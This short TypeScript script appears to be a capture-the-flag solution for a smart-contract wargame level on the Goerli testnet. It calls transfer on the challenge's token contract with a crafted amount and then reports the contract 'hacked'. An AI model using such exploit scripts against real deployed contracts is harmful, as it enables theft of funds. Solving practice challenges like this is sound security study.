import { ethers } from "ethers";
import { Token__factory } from '../typechain-types';

// Task: increase someone balance

const rpc = 'https://rpc.ankr.com/eth_goerli'
const privateKey = ''
const instanceAddress = ''

const main = async () =>  {
    let tx;
  
    const provider = new ethers.JsonRpcProvider(rpc);
    const signer = new ethers.Wallet(privateKey, provider);

    const contract = Token__factory.connect(instanceAddress, signer);

    console.log("Hacking the contract...");

    tx = await contract.connect(signer).transfer(instanceAddress, 21);
    await tx.wait();

    const balance = await contract.balanceOf(instanceAddress);

    console.log("Successfully hacked!");
    console.log("Receiver balance:", balance);
}

main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});